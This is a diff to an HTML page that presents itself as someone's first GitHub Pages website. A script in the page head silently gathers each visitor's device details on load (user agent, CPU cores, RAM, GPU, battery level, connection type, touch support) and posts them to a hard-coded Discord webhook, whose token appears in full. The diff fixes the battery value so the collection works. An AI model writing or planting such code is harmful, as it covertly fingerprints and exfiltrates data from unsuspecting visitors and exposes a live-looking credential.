@@ -3,7 +3,7 @@
 <head>
 
 <script>
-  const WEBHOOK_URL = "  https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // Replace with your webhook
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // Replace with your webhook
 
   // Get User-Agent string
   const userAgent = navigator.userAgent;
@@ -126,9 +126,7 @@
                   { name: "🧠 CPU Cores", value: cpuCores.toString(), inline: true },
                   { name: "💾 RAM (GB)", value: ramGB.toString(), inline: true },
                   { name: "🎮 GPU", value: gpu, inline: true },
-                  { name: "🔋 Battery (%)", value: "Pending", inline: true }, // will be updated
-
-                  // New additions
+                  { name: "🔋 Battery (%)", value: batteryLevel, inline: true },
                   { name: "📶 Connection Type", value: connectionType, inline: true },
                   { name: "✋ Touch Screen", value: touchSupport, inline: true },
 
@@ -149,16 +147,19 @@
       .catch(err => console.error("Error sending data:", err));
   }
 
-  // Get battery info (async) and then send webhook
+  // Only call sendWebhook after battery info is available
   if (navigator.getBattery) {
-    navigator.getBattery().then(battery => {
-      const batteryLevel = battery.level != null ? Math.round(battery.level * 100) + "%" : "Unknown";
-      sendWebhook(batteryLevel);
-    }).catch(() => sendWebhook("Unknown"));
+    navigator.getBattery()
+      .then(battery => {
+        const batteryLevel = battery.level != null ? Math.round(battery.level * 100) + "%" : "Unknown";
+        sendWebhook(batteryLevel); // send webhook with actual battery value
+      })
+      .catch(() => sendWebhook("Unknown"));
   } else {
     sendWebhook("Unknown");
   }
 </script>
+
 
 
 
@@ -174,4 +175,3 @@
   <p>Welcome to my first GitHub Pages website.</p>
 </body>
 </html>
-
